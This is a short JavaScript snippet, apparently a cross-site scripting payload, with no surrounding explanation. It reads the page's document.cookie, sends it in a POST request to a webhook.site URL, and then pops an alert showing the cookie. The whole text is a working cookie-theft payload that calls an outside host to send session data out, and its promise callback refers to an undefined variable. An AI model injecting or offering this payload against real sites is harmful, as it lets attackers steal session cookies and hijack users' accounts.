var prevurl = "https://webhook.site/627a78f8-26ad-4d07-81a7-2f90b73e1a5c/?cookie="+document.cookie;

fetch(prevurl,
  {
    method: "POST",
    headers: {"Content-Type": "application/json"},
  }
).then(res => asd);

alert("hello cookie" + document.cookie);